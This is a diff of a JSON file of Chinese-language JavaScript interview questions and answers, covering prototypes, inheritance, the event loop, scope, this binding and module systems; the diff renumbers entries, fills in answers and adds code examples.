@@ -24,134 +24,134 @@
         },
         {
           "id": "js-basic-4",
-          "title": "作用域",
-          "content": "",
-          "hasAnswer": false
-        },
-        {
-          "id": "js-basic-5",
           "title": "原型与原型链",
           "content": "1.函数的`prototype`：Constructor.prototype,  仅存在于函数（构造函数/类）上**它指向一个对象，这个对象就是未来**所有实例对象**将继承的公共属性和方法的集合。\n\n2.`__proto__` :存在于所有实例对象上这是一个内部属性 (`[[Prototype]]` )，它指向创建该实例的构造函数的 `prototype` 对象。`Object.getPrototypeOf()`来访问\n\n原型链是由于对象通过 `__proto__` (内部的 `[[Prototype]]`) 链接到其构造函数的原型对象，而构造函数的原型对象本身也是一个对象，它也有自己的 `__proto__`，如此层层递进，直到链的末端。\n\n原型链是 JavaScript 实现**继承和属性共享**的机制。属性和方法都存储在原型上，所有实例共享同一份，这大大节省了内存空间。\n\n当访问实例对象上的一个属性，JS 引擎会首先检查该实例对象自身是否有这个属性，如果实例自身没有找到，引擎会沿着 `__proto__` 链接向上，到它的原型对象上查找。 如果仍未找到，查找会沿着原型链一直向上，直到到达 `Object.prototype`。`Object.prototype` 的 `__proto__` 是 `null`。如果查找到 `null` 仍未找到，则返回 `undefined`。\n\n**`class` 语法：** ES6 的 `class` 语法是原型和原型链的**语法糖**。它没有改变底层机制，只是提供了一种更清晰的方式来定义构造函数和方法。",
           "hasAnswer": true
         },
         {
-          "id": "js-basic-6",
+          "id": "js-basic-5",
           "title": "继承",
-          "content": "原型链继承**原型链** 是 JS 继承的**唯一底层机制**\n\n1.原型继承，核心：让子类原型对象指向父类实例。当父类的原型上包含**引用类型**的属性时，所有子类实例都会**共享**这个属性。一个实例修改，所有实例都受影响\n\n2.组合继承：【核心优化】：创建父类原型对象的副本，并赋值给子类原型+【构造器指针修正】：将子类构造器指向自身。特点：独立属性+原型共享\n\nes6的class extend super\n\n`class` 关键字**并没有改变底层原型继承的机制**，它只是提供了一套更清晰的 API 来定义构造函数、原型方法和静态方法。\n\n`extends` 的底层操作：\n\n1. **设置子类的原型链：** 自动将 `Child.prototype` 的原型（即 `Child.prototype.__proto__`）设置为 `Parent.prototype`，实现了**方法继承**。\n\n2. **构造函数关联：** 自动将 `Child.__proto__` 设置为 `Parent`，实现了**静态属性和方法的继承**。\n\n`super` 关键字\n\n`super` 是在 `class` 继承中最核心、最关键的机制，它在两个场景下工作：\n\n1. **在 `constructor` 中：** 必须调用 `super()`。它负责调用父类的构造函数，并**将子类实例的 `this` 绑定到父类**。在子类构造函数中，必须在引用 `this` 之前调用 `super()`。\n\n2. **在方法中：** 用于调用父类原型上的同名方法（如 `super.methodName()`）。",
+          "content": "核心：原型链继承**原型链** 是 JS 继承的**唯一底层机制**\n\n1.原型继承，核心：让子类原型对象指向父类实例。\n\n- **做法**：`Child.prototype = new Parent()`\n- **缺点**：**引用类型属性共享**。当父类的原型上包含**引用类型**的属性时（比如一个数组），其中一个子类改了数组，所有子类都会跟着变。\n\n2.组合继承：【核心优化】：创建父类原型对象的副本，并赋值给子类原型+【构造器指针修正】：将子类构造器指向自身。特点：独立属性+原型共享。缺点是`Parent` 构造函数被调用了两次\n\n```\nfunction Child(name, age) { \n\t// 【核心步骤 A】：继承属性 \n\t// 通过 call 调用父类构造函数，将 Parent 的属性绑定到 Child 的实例上 \n\tParent.call(this, name); \n\tthis.age = age; \n}\n\n// 【核心步骤 B】：继承方法: 将 Child 的原型指向 Parent 的一个实例，从而接入原型链 Child.prototype = new Parent(); \n// 4. 修复 constructor 指向 \n// 因为重写了原型，Child.prototype.constructor 现在指向的是 Parent，需要手动改回来 Child.prototype.constructor = Child; \n```\n\n3.终极方案：寄生组合式继承（必杀技）\n\n**这是面试官最想听到的答案，也是 ES6 `class` 背后的核心原理。**\n\n- **核心思想**：不 `new Parent()` 了，直接造一个父类原型的副本。    \n- **优势**：只调用一次父类构造函数，原型链保持完整，效率最高。\n\n```\nChild.prototype = Object.create(Parent.prototype);\nChild.prototype.constructor = Child;\n```\n\n3.es6的class extend super,  **本质**是寄生组合继承的**语法糖**。\n\n`class` 关键字**并没有改变底层原型继承的机制**，它只是提供了一套更清晰的 API 来定义构造函数、原型方法和静态方法。\n\n`extends` 的底层操作：\n\n1. **设置子类的原型链：** 自动将 `Child.prototype` 的原型（即 `Child.prototype.__proto__`）设置为 `Parent.prototype`，实现了**方法继承**。\n\n2. **构造函数关联：** 自动将 `Child.__proto__` 设置为 `Parent`，实现了**静态属性和方法的继承**。\n\n`super` 关键字： `super` 是在 `class` 继承中最核心、最关键的机制，它在两个场景下工作：\n\n1. **在 `constructor` 中：** 必须调用 `super()`。它负责调用父类的构造函数，并**将子类实例的 `this` 绑定到父类**。在子类构造函数中，必须在引用 `this` 之前调用 `super()`。\n\n2. **在方法中：** 用于调用父类原型上的同名方法（如 `super.methodName()`）。\n\n```\nclass Child extends Parent {\n    constructor(name, age) {\n        // 【核心】：必须先调用 super()，它负责执行父类的构造函数并创建 this\n        super(name); \n        this.age = age;\n    }\n\n    // 子类自己的方法\n    sayAge() {\n        console.log(`我今年 ${this.age} 岁了`);\n    }\n\n    // 【重写/多态】：子类可以覆盖父类的方法\n    sayName() {\n        // 也可以通过 super 调用父类被覆盖的方法\n        super.sayName(); \n        console.log('这是子类重写后的逻辑');\n    }\n}\n```",
           "hasAnswer": true
         },
         {
-          "id": "js-basic-7",
-          "title": "new操作符",
+          "id": "js-basic-6",
+          "title": "new操作符做了什么",
           "content": "1创建新对象\n\n2新对象原型指向构造函数原型对象\n\n3绑定this并执行构造函数\n\n4如果构造函数有返回就直接返回，否则返回新对象",
           "hasAnswer": true
         },
         {
+          "id": "js-basic-7",
+          "title": "讲讲js的事件循环",
+          "content": "宏任务和微任务的区分是为了做什么? 优先级有什么区别?\n\n答：是为了保证异步代码执行的**确定性、优先级和性能**。微任务享有绝对的**插队权**。\n\n核心目的在于创建**两级异步优先级系统**，确保高优先级、对性能敏感的任务能够快速执行，同时避免长时间阻塞浏览器渲染。\n\n微任务 (Microtasks) 的目的：高优先级，保证状态一致性。微任务在**当前同步代码执行完毕后，浏览器进行下一次渲染之前**立即执行。例如，Promise 链需要保证在一个 DOM 或 UI 渲染周期内全部解析完成，以避免 UI 闪烁或数据不一致。\n\n宏任务 (Macrotasks) 的目的：低优先级，调度 I/O 和 UI 渲染。不阻塞渲染\n\n注意：初始同步脚本执行完毕，**执行上下文栈（ECS）清空时**，事件循环机制才真正开始接管，并进入检查队列的循环。\n\n所有的异步事件一定是当前浏览器执行完同步任务空闲了才做的",
+          "hasAnswer": true
+        },
+        {
           "id": "js-basic-8",
-          "title": "事件循环",
-          "content": "宏任务和微任务的区分是为了做什么?优先级?\n\n答：是为了保证异步代码执行的**确定性、优先级和性能**。微任务享有绝对的**插队权**。\n\n核心目的在于创建**两级异步优先级系统**，确保高优先级、对性能敏感的任务能够快速执行，同时避免长时间阻塞浏览器渲染。\n\n微任务 (Microtasks) 的目的：高优先级，保证状态一致性。微任务在**当前同步代码执行完毕后，浏览器进行下一次渲染之前**立即执行。例如，Promise 链需要保证在一个 DOM 或 UI 渲染周期内全部解析完成，以避免 UI 闪烁或数据不一致。\n\n宏任务 (Macrotasks) 的目的：低优先级，调度 I/O 和 UI 渲染。不阻塞渲染",
+          "title": "全局对象",
+          "content": "在不同的环境下，全局对象的名字和表现有所不同：\n\n- **浏览器环境**：全局对象是 `window`。\n- **Node.js 环境**：全局对象是 `global`。\n- **统一规范**：为了跨环境兼容，ES11 引入了 **`globalThis`**，无论在哪个环境下，它都指向当前环境的全局对象。\n\n> **面试避坑指南：** 在全局作用域下用 `var` 声明的变量会挂载到全局对象上，但用 `let` 或 `const` 声明的变量**不会**。这是因为 ES6 之后，全局作用域内部还存在一个“块级作用域”的顶层环境。",
           "hasAnswer": true
         },
         {
           "id": "js-basic-9",
-          "title": "全局对象",
-          "content": "",
-          "hasAnswer": false
-        },
-        {
-          "id": "js-basic-10",
-          "title": "普函通数和箭函头数有么什区别",
-          "content": "",
-          "hasAnswer": false
-        },
-        {
-          "id": "js-basic-11",
           "title": "js类型转换",
           "content": "显式转换 (Explicit Coercion)**：通过 `Number()`、`String()`、`Boolean()` 等内置函数或 `parseInt` 等方法进行的**主动**转换。\n\n隐式转换 (Implicit Coercion)**：在运行时，由 JS 引擎根据操作符（如 `==`、`+`、`-`）的需要**自动**进行的转换。\n\n1.转换为 Boolean (转布尔)。这是最简单的转换，发生在逻辑判断、`if` 语句和 `!` 操作符中。\n\n2.转换为 String (转字符串)。发生在字符串拼接（`'a' + b`）、`alert()` 或 `String(value)` 中。规则：原始值直接转换。对象通过调用内部的 **`ToString` 抽象操作**实现\n\n3.转换为 Number (转数字)。发生在数学运算（`-`, `*`, `/`）或一元加操作符（`+a`）中。\n\n规则： 原始值有明确的转换规则（如 `null` 转 $0$，`\"123\"` 转 $123$）。对象通过调用内部的 `ToNumber` 抽象操作实现。",
           "hasAnswer": true
         },
         {
-          "id": "js-basic-12",
+          "id": "js-basic-10",
           "title": "闭包",
           "content": "注意：闭包 = 函数 + 它能访问的、已脱离当前执行上下文的外部变量\n\n作用：创建私有变量；外部访问私有变量；延长变量生命周期；模块化基础\n\n注意：使用不当容易内存泄漏；性能开销比普通函数大\n\n如何避免内存泄漏? \n\n解除引用：当你确定一个闭包不再需要使用时，应该手动解除对它的引用。通过将持有闭包的变量设置为 `null` 或 `undefined`，使其失去引用。\n\n```js\nlet closureFunc = outerFunc(); // 创建闭包\n// ... 使用 closureFunc ...\nclosureFunc = null; // 手动解除引用，帮助 GC 回收内存\n```",
           "hasAnswer": true
         },
         {
-          "id": "js-basic-13",
-          "title": "call  apply bind",
-          "content": "",
-          "hasAnswer": false
-        },
-        {
-          "id": "js-basic-14",
-          "title": "严格模式",
-          "content": "严格模式是 ES5 引入的一种特殊模式，旨在选择性地限制 JavaScript 的某些不安全、低效或有缺陷的行为\n\n- **全局模式：** 在脚本文件顶部添加 `\"use strict\";`。\n\n- **函数模式：** 在函数体内部顶部添加 `\"use strict\";`\n\n严格模式是保证代码质量和项目维护性的要求\n\n重要规则：\n\n禁止隐式全局变量：尝试给未声明的变量赋值时，将不再自动在全局对象 (`window` 或 `global`) 上创建该变量，而是**直接抛出 `ReferenceError`**。\n\n规范 `this` 默认绑定（上下文可预测性）：独立函数调用 `this` 为 `undefined`\n\n静默失败转为抛出错误 (代码健壮性)\n\n禁用堆栈调用属性，禁止函数动态获取调用栈信息，（严重阻碍了js 引擎进行即时编译优化",
+          "id": "js-basic-11",
+          "title": "for..in for..of区别",
+          "content": "记忆：KEY in OBJECT, VALUE of ITERABLE，`in` 拿 Key（下标），`of` 拿 Value（内容）\n\n| **特性**   | **for..in**          | **for..of (ES6)**                      |\n| -------- | -------------------- | -------------------------------------- |\n| **迭代内容** | 迭代的是 **Key (键名/索引)** | 迭代的是 **Value (键值)**                    |\n| **适用范围** | 主要用于**对象**，也可用于数组    | 只要部署了 **Iterator 接口** (数组、Map、Set、字符串) |\n| **原型链**  | **会**遍历原型链上的可枚举属性    | **不会**遍历原型链                            |\n| **顺序**   | 顺序不确定（对象属性无序）        | 按迭代器的顺序执行（数组是有序的）                      |",
           "hasAnswer": true
         },
         {
-          "id": "js-basic-15",
+          "id": "js-basic-12",
+          "title": "call  apply bind 区别",
+          "content": "这三个方法都是为了**改变函数执行时的 `this` 指向**。\n\n- **`call(context, arg1, arg2...)`**：立即执行。参数是一个个传进去的。\n\n- **`apply(context, [args])`**：立即执行。参数是以**数组**形式传进去的。\n\n- **`bind(context, arg1...)`**：**不会立即执行**。它会返回一个新的函数，并永久绑定了 `this`，后续调用时再传入剩余参数。",
+          "hasAnswer": true
+        },
+        {
+          "id": "js-basic-13",
           "title": "导致js里this指向混乱的原因是什么?",
           "content": "根本原因在于：**普通函数采用动态绑定（Dynamic Binding），其 `this` 的值不是在函数定义时确定的，而是在函数被调用时，根据函数调用的方式（Call Site）临时决定的。**\n\n`this` 的值高度依赖于**调用函数时的上下文**，这种运行时（Runtime）绑定机制与 JS 的词法作用域规则形成了鲜明对比，造成了巨大的认知负担。\n\nES6 的解决方案：箭头函数，没有自己的动态 `this`，`this` 变得可预测、不可变，不再受调用方式的影响",
           "hasAnswer": true
         },
         {
-          "id": "js-basic-16",
+          "id": "js-basic-14",
+          "title": "你觉得js里this的设计怎么样?有没有什么缺点",
+          "content": "`this` 的设计初衷是为了实现高度的**灵活性**和**代码复用**。通过显式绑定隐式绑定可以更加灵活\n\n`this` 的所有缺点都源于一个核心问题：**它的值是动态绑定（Runtime Dynamic Binding）的，依赖于函数的调用点 (Call Site)，而不是定义点。**\n\n有严重的上下文丢失陷阱：回调函数问题： 当一个对象的方法被作为参数传递给异步函数（如 `setTimeout`、`Promise.then()`）或事件处理器时，它通常会失去其隐式绑定，退化为**默认绑定（指向全局对象或 `undefined`）**。\n\n违反词法作用域原则 ：JavaScript 的变量（使用 `let/const`）是词法作用域（静态确定）的，但 `this` 却是动态作用域的。这种不一致性打破了语言的统一性，使得在阅读嵌套代码时很难预测 `this` 的值。\n\nes6通过箭头函数和class弥补了这个问题，开发者应当尽可能利用箭头函数和 `class` 语法来避免直接依赖普通函数的动态 `this` 机制",
+          "hasAnswer": true
+        },
+        {
+          "id": "js-basic-15",
           "title": "运算符",
           "content": "ES2020 新增：空值合并运算符 `??` (Nullish Coalescing)\n\n用途：** 专门用于处理 `null` 或 `undefined` 的默认值设置。解决了 `||` 在处理 `0` 和 `\"\"` 时的缺陷。\n\n规则：** 只有当左侧操作数是 `null` 或 `undefined` 时，才返回右侧操作数。\n\nES2021 新增：逻辑赋值运算符\n\n- **`||=` (OR 赋值)：** 只有当左侧为 Falsy 时才赋值。\n\n- **`??=` (空值赋值)：** 只有当左侧为 `null` 或 `undefined` 时才赋值。\n\n其他：typeof  instanceof  delete",
           "hasAnswer": true
         },
         {
-          "id": "js-basic-17",
+          "id": "js-basic-16",
           "title": "执行上下文",
           "content": "JavaScript 引擎在运行代码时，会维护一个 **执行上下文栈 (Execution Context Stack)**，也称为调用栈 (Call Stack)。\n\n- **入栈：** 当代码开始执行或调用函数时，新的执行上下文会被创建并推入栈顶。\n\n- **出栈：** 当函数执行完毕，其上下文会从栈中弹出，控制权返回给栈中的上一个上下文。\n\n- **流程：** 栈底永远是 **全局执行上下文**。\n\n全局执行上下文：它创建全局对象（ `window`、Node.js 中的 `global`）和 `this` 绑定。\n\n函数执行上下文 ：每当一个函数被调用时，都会创建一个新的~~。每次调用都是独立的\n\n阶段一：创建阶段 (Creation Phase / 编译阶段)\n\n在代码执行之前，引擎会扫描函数代码，完成以下三项任务：\n\n1. 确定 `this` 绑定 (ThisBinding)：全局 EC绑定到全局对象；函数EC按调用方式绑定\n\n2. 创建词法环境 (LexicalEnvironment)：存储 `let`、`const`  `class` 声明\n\n3. 创建变量环境 (VariableEnvironment)：用于存储 `var` 变量声明和函数声明\n\n阶段二：执行阶段 (Execution Phase)\n\n引擎开始逐行执行代码，完成以下任务：\n\n1. **变量赋值：** 将值赋给变量（之前在创建阶段被初始化为 `undefined` 或保持未初始化状态）。\n\n2. **代码执行：** 执行所有函数调用和其它语句。",
           "hasAnswer": true
         },
         {
-          "id": "js-basic-18",
+          "id": "js-basic-17",
           "title": "词法环境",
           "content": "**词法环境 (Lexical Environment)** 是 **ECMAScript 标准中定义的具体数据结构**，它是执行上下文（EC）的核心组成部分。它是一个**运行时 (runtime) 对象**，在每个执行上下文创建时生成。它有两个关键部分：\n\n1. **环境记录 (Environment Record)：**\n   \n   - 实际存储变量和函数声明的地方。\n   \n   - **声明式环境记录：** 存储 `let`、`const`、`class`。它们被创建时不会初始化，从而产生**暂时性死区 (TDZ)**。\n   \n   - **对象环境记录：** 在全局 EC 中，存储 `var` 变量和函数。\n\n2. **外部环境引用 (Outer Environment Reference)：**\n   \n   - 指向**创建该执行上下文时的父级执行上下文的词法环境**。\n   \n   - 这个引用链条就是 **作用域链 (Scope Chain)** 的基础，用于变量查找。\n\n总结： 当我们在函数内部访问变量时，JS 引擎会首先在当前 执行上下文 的中查找，如果找不到，就会沿着 **作用域链** 向上查找，直到全局 EC，所以函数能访问外部的变量，这也是闭包的前提。\n\n`let` 在 `for` 循环中会为每次迭代创建独立的词法环境，因此闭包捕获的是不同的 i，而不是同一个变量。",
           "hasAnswer": true
         },
         {
+          "id": "js-basic-18",
+          "title": "说说js的作用域",
+          "content": "A. 三种作用域：\n\n1. **全局作用域**：代码任何地方都能访问。\n2. **函数作用域**：变量只在函数内部可见。\n3. **块级作用域 (ES6+)**：由 `{}` 包裹的区域（配合 `let` / `const` 使用）。\n\nB. 作用域链 (Scope Chain)：\n\n当 JS 引擎寻找一个变量时，会先在当前作用域找。如果找不到，就去**父级作用域**找，直到找到全局作用域为止。这种链式查找机制就是作用域链。\n\nC. JS 采用的是**静态作用域**（即词法作用域）。\n\n**词法作用域 (Lexical Scope)** 是一个**抽象的、静态的编程原则或规则**。\n\n- **性质：** 它只取决于代码在 **哪里被编写 (定义)**，与代码在运行时 **哪里被调用** 无关。\n- **作用：** 它决定了变量的可访问性范围。\n- 这意味着函数的作用域在**函数定义的时候**就决定了，而不是在函数调用的时候。",
+          "hasAnswer": true
+        },
+        {
           "id": "js-basic-19",
-          "title": "作用域",
-          "content": "js讨论词法作用域，**词法作用域 (Lexical Scope)** 是一个**抽象的、静态的编程原则或规则**。\n\n- **性质：** 它只取决于代码在 **哪里被编写 (定义)**，与代码在运行时 **哪里被调用** 无关。\n\n- **作用：** 它决定了变量的可访问性范围。\n\n词法环境是 JavaScript 引擎用来**记录和追踪**变量，严格遵守**词法作用域**规则",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-20",
-          "title": "Set、Map、WeakSet、weakMap 的区别",
-          "content": "Weak 系列与普通系列的本质区别，就在于**垃圾回收 (GC)** 机制。\n\n1. 强引用 (Strong Reference)：Map & Set\n- 如果一个对象被 `Map` 或 `Set` 引用，那么这个对象就不会被垃圾回收机制回收。\n\n- **副作用：** 如果你将 DOM 元素或大型对象作为键或值存储在 `Map` 或 `Set` 中，即使该对象在代码中已无其他引用，它也会被 Map/Set **钉死在内存中**，直到你手动调用 `.delete()` 移除，否则会导致**内存泄漏**。\n2. 弱引用 (Weak Reference)：WeakMap & WeakSet\n- 如果一个对象**只**被 `WeakMap` 或 `WeakSet` 引用，那么这个对象**可以**被垃圾回收机制回收。\n\n- **自动清理：** 一旦对象被 GC 回收，它在 `Weak` 集合中的对应条目也会被 **自动移除**。\n\n- **副作用消除：** 它们专为**不干扰 GC** 的非核心数据存储而设计，是避免内存泄漏的强大工具。\n3. Weak 集合的特殊限制（不可迭代的原因）\n\n`WeakMap` 和 `WeakSet` 具有不可迭代性，也不支持 `.clear()` 或 `.size` 属性。\n\n- **原因：** 由于它们是弱引用，集合中的对象随时可能被 GC 回收而消失。\n\n- **后果：** 如果允许迭代，你将无法保证在迭代开始和结束时集合内容的一致性，这会导致代码逻辑不可预测。\n\n高级应用场景（Use Cases）\n\nA. WeakMap：关联私有数据或缓存\n\n- **场景：** 在不修改原对象的情况下，为其关联额外的数据或缓存。\n\n- **示例：** 创建一个 `WeakMap` 来存储 DOM 元素的事件监听器。当 DOM 元素被移除时（被 GC 回收），WeakMap 中对应的事件监听器也会自动清理，**防止内存泄漏**。\n\nB. WeakSet：跟踪对象状态或成员资格\n\n- **场景：** 简单地跟踪一个大型对象集合中，哪些对象处于“活动”或“已处理”状态，但又不想阻止这些对象被 GC 回收。\n\n- **示例：** 跟踪一个大型应用中哪些对象实例已经被初始化或激活，用于防止重复处理。\n\n总结来说，`Set` 和 `Map` 是通用的数据结构，用于**核心数据存储**；而 `WeakSet` 和 `WeakMap` 是用于**关联辅助数据、解决内存泄漏问题**的**工具**。",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-21",
-          "title": "es6新特性",
-          "content": "1. 作用域与变量管理 (Scope & Mutability)\n- **`let` 和 `const`：** 引入**块级作用域 (Block Scoping)**，彻底解决了 `var` 导致的变量提升和作用域污染问题，增强了代码的稳定性和可预测性。\n2. 异步编程基石 (Async Foundation)\n- **Promises：** 提供了结构化、可链式调用的异步处理方案，解决了传统回调函数的**回调地狱 (Callback Hell)**，是 `async/await` 的底层基础。\n3. 函数与上下文 (Functions & Context)\n- **箭头函数 (`=>`)：** 语法简洁。核心价值在于使用**词法 `this`**，消除了普通函数中 `this` 绑定不明确的痛点，使上下文指向更加可靠。\n4. 数据结构与模块化 (Data & Structure)\n- **`class` 语法：** 基于原型继承的**语法糖**，使面向对象编程（OOP）更接近传统语言模式，提高了可读性。\n\n- **解构赋值/扩展运算符 (`...`)：** 极大地简化了数据操作，如数组合并、对象浅拷贝、函数参数收集等，提高了代码简洁性。\n\n- **`Map` 和 `Set`：** 提供了更高效的数据结构，解决了传统 JS 对象作为键的限制 (`Map`) 和快速去重 (`Set`) 的需求。",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-22",
-          "title": "ES6模块和Common]S模块的区别",
-          "content": "核心区别在于 **CommonJS 是为服务器端同步加载设计的**，而 **ES Modules 是为浏览器端异步加载和静态分析设计的**。\n\n- CJS 是在 Node.js 环境中诞生的，文件模块通常存储在本地硬盘上。因此，CJS 可以使用 `require()` **同步阻塞**地加载文件。它在**运行时**执行代码后，才能知道导入了什么。\n\n- **ES Modules (异步)：** ESM 是为浏览器设计的，模块通常需要通过网络请求加载。因此，ESM 采用**异步加载**，以避免阻塞主线程。ESM 在**代码静态解析阶段**（编译时）就能确定所有依赖关系。\n\n- **CommonJS (动态值拷贝)：**\n  \n  - CJS 导出的是一个值的**拷贝**。一旦模块导出，原始模块内部对变量的修改不会影响到导入方。\n  \n  - `require()` 得到的是一份导出的**值的快照**。\n\n- **ES Modules (静态实时绑定/引用)：**\n  \n  - ESM 导出的是对原始变量的**引用**（Live Binding）。\n  \n  - 这意味着导入方和导出方共享同一个变量。如果导出方在后续代码中修改了该变量，导入方可以观察到这种变化。\n\n**ESM 的优势：** 由于 ESM 采用 `import` / `export` 这种**静态语法**，JS 引擎或构建工具（如 Webpack/Rollup）可以在不执行代码的情况下，分析出模块之间的依赖关系。这使得 **Tree-Shaking（摇树优化）**成为可能，即只打包实际用到的代码，极大地减小了最终产物大小。",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-23",
           "title": "Object.create(proto) 方法",
           "content": "其中 *proto* 是新对象的原型对象\n\n`Object.create()` 的主要目的**不是复制 (Clone)** 一个现有对象，而是创建一个**新对象**，并精确控制新对象的**原型 (Prototype)**。\n\n`Object.create()` 的第一个参数是 **强制要求** 传入的，它就是新创建对象的 **`[[Prototype]]` (即 `__proto__`)**。\n\n核心能力是作为 **ECMAScript 官方提供的、创建指定原型对象**的方法，它是实现纯净原型继承的最佳实践。",
           "hasAnswer": true
         },
         {
-          "id": "js-basic-24",
+          "id": "js-basic-20",
           "title": "Object.assign()",
           "content": "`Object.assign(target, ...sources)` 方法用于将所有**可枚举 (enumerable) 的自有属性 (own properties)** 的值，从一个或多个**源对象 (source)** 复制到**目标对象 (target)**。\n\n返回值： 返回修改后的目标对象 `target`。\n\n仅执行浅拷贝 (Shallow Copy Only)\n\n只复制可枚举的自有属性\n\n一般用于**合并配置对象 (Merging)：** 将默认配置与用户提供的配置合并。",
           "hasAnswer": true
         },
         {
-          "id": "js-basic-25",
+          "id": "js-basic-21",
+          "title": "Object.defineProperties 的作用",
+          "content": "把参数2的属性赋值给参数1，特点是不仅复制属性，还复制属性的属性，比如是否可枚举、可修改这些属性\n\n- 不仅仅是赋值，而是**使用属性描述符定义属性**\n\n- 可以控制属性的可写性、可枚举性、可配置性\n\n- 可以定义访问器属性（getter/setter）\n\n- 默认属性特性与普通赋值不同",
+          "hasAnswer": true
+        },
+        {
+          "id": "js-basic-22",
+          "title": "es6新特性",
+          "content": "1. 作用域与变量管理 (Scope & Mutability)\n- **`let` 和 `const`：** 引入**块级作用域 (Block Scoping)**，彻底解决了 `var` 导致的变量提升和作用域污染问题，增强了代码的稳定性和可预测性。\n2. 异步编程基石 (Async Foundation)\n- **Promises：** 提供了结构化、可链式调用的异步处理方案，解决了传统回调函数的**回调地狱 (Callback Hell)**，是 `async/await` 的底层基础。\n3. 函数与上下文 (Functions & Context)\n- **箭头函数 (`=>`)：** 语法简洁。核心价值在于使用**词法 `this`**，消除了普通函数中 `this` 绑定不明确的痛点，使上下文指向更加可靠。\n4. 数据结构与模块化 (Data & Structure)\n- **`class` 语法：** 基于原型继承的**语法糖**，使面向对象编程（OOP）更接近传统语言模式，提高了可读性。\n- **解构赋值/扩展运算符 (`...`)：** 极大地简化了数据操作，如数组合并、对象浅拷贝、函数参数收集等，提高了代码简洁性。\n- **`Map` 和 `Set`：** 提供了更高效的数据结构，解决了传统 JS 对象作为键的限制 (`Map`) 和快速去重 (`Set`) 的需求。",
+          "hasAnswer": true
+        },
+        {
+          "id": "js-basic-23",
+          "title": "Set、Map、WeakSet、weakMap 的区别",
+          "content": "Weak 系列与普通系列的本质区别，就在于**垃圾回收 (GC)** 机制。\n\n1. 强引用 (Strong Reference)：Map & Set\n- 如果一个对象被 `Map` 或 `Set` 引用，那么这个对象就不会被垃圾回收机制回收。\n\n- **副作用：** 如果你将 DOM 元素或大型对象作为键或值存储在 `Map` 或 `Set` 中，即使该对象在代码中已无其他引用，它也会被 Map/Set **钉死在内存中**，直到你手动调用 `.delete()` 移除，否则会导致**内存泄漏**。\n2. 弱引用 (Weak Reference)：WeakMap & WeakSet\n- 如果一个对象**只**被 `WeakMap` 或 `WeakSet` 引用，那么这个对象**可以**被垃圾回收机制回收。\n\n- **自动清理：** 一旦对象被 GC 回收，它在 `Weak` 集合中的对应条目也会被 **自动移除**。\n\n- **副作用消除：** 它们专为**不干扰 GC** 的非核心数据存储而设计，是避免内存泄漏的强大工具。\n3. Weak 集合的特殊限制（不可迭代的原因）\n\n`WeakMap` 和 `WeakSet` 具有不可迭代性，也不支持 `.clear()` 或 `.size` 属性。\n\n- **原因：** 由于它们是弱引用，集合中的对象随时可能被 GC 回收而消失。\n\n- **后果：** 如果允许迭代，你将无法保证在迭代开始和结束时集合内容的一致性，这会导致代码逻辑不可预测。\n\n高级应用场景（Use Cases）\n\nA. WeakMap：关联私有数据或缓存\n\n- **场景：** 在不修改原对象的情况下，为其关联额外的数据或缓存。\n\n- **示例：** 创建一个 `WeakMap` 来存储 DOM 元素的事件监听器。当 DOM 元素被移除时（被 GC 回收），WeakMap 中对应的事件监听器也会自动清理，**防止内存泄漏**。\n\nB. WeakSet：跟踪对象状态或成员资格\n\n- **场景：** 简单地跟踪一个大型对象集合中，哪些对象处于“活动”或“已处理”状态，但又不想阻止这些对象被 GC 回收。\n\n- **示例：** 跟踪一个大型应用中哪些对象实例已经被初始化或激活，用于防止重复处理。\n\n总结来说，`Set` 和 `Map` 是通用的数据结构，用于**核心数据存储**；而 `WeakSet` 和 `WeakMap` 是用于**关联辅助数据、解决内存泄漏问题**的**工具**。",
+          "hasAnswer": true
+        },
+        {
+          "id": "js-basic-24",
           "title": "箭头函数与普通函数的差异",
-          "content": "没有this, 继承外层作用域的 `this`。\n\n不能new\n\n不能call bind apply\n\n没有 `arguments` 对象\n\n不支持 `yield` 关键字",
+          "content": "没有自己的this, 继承外层作用域的 `this`。\n\n不能new\n\n不能call bind apply\n\n没有 `arguments` 对象\n\n不支持 `yield` 关键字",
+          "hasAnswer": true
+        },
+        {
+          "id": "js-basic-25",
+          "title": "ES6模块和Common]S模块的区别",
+          "content": "核心区别在于 **CommonJS 是为服务器端同步加载设计的**，而 **ES Modules 是为浏览器端异步加载和静态分析设计的**。\n\n- CJS 是在 Node.js 环境中诞生的，文件模块通常存储在本地硬盘上。因此，CJS 可以使用 `require()` **同步阻塞**地加载文件。它在**运行时**执行代码后，才能知道导入了什么。\n\n- **ES Modules (异步)：** ESM 是为浏览器设计的，模块通常需要通过网络请求加载。因此，ESM 采用**异步加载**，以避免阻塞主线程。ESM 在**代码静态解析阶段**（编译时）就能确定所有依赖关系。\n\n- **CommonJS (动态值拷贝)：**\n  \n  - CJS 导出的是一个值的**拷贝**。一旦模块导出，原始模块内部对变量的修改不会影响到导入方。\n  \n  - `require()` 得到的是一份导出的**值的快照**。\n\n- **ES Modules (静态实时绑定/引用)：**\n  \n  - ESM 导出的是对原始变量的**引用**（Live Binding）。\n  \n  - 这意味着导入方和导出方共享同一个变量。如果导出方在后续代码中修改了该变量，导入方可以观察到这种变化。\n\n**ESM 的优势：** 由于 ESM 采用 `import` / `export` 这种**静态语法**，JS 引擎或构建工具（如 Webpack/Rollup）可以在不执行代码的情况下，分析出模块之间的依赖关系。这使得 **Tree-Shaking（摇树优化）**成为可能，即只打包实际用到的代码，极大地减小了最终产物大小。",
           "hasAnswer": true
         },
         {
@@ -162,80 +162,50 @@
         },
         {
           "id": "js-basic-27",
-          "title": "for..in for..of区别：",
-          "content": "KEY in OBJECT, VALUE of ITERABLE",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-28",
-          "title": "async/await 的实现原理是什么?它和Promise、Generator之间有什么关系?",
-          "content": "`async/await` 是对 **Promise** 和 **Generator** 的一种**语法糖 (Syntactic Sugar)**。\n\n- **Promise** 是 `async/await` 的**外部接口**（输入和输出）。\n\n- **Generator** 是 `async/await` 实现**暂停和恢复**的**内部引擎**。",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-29",
           "title": "let/const/var 的底层区别",
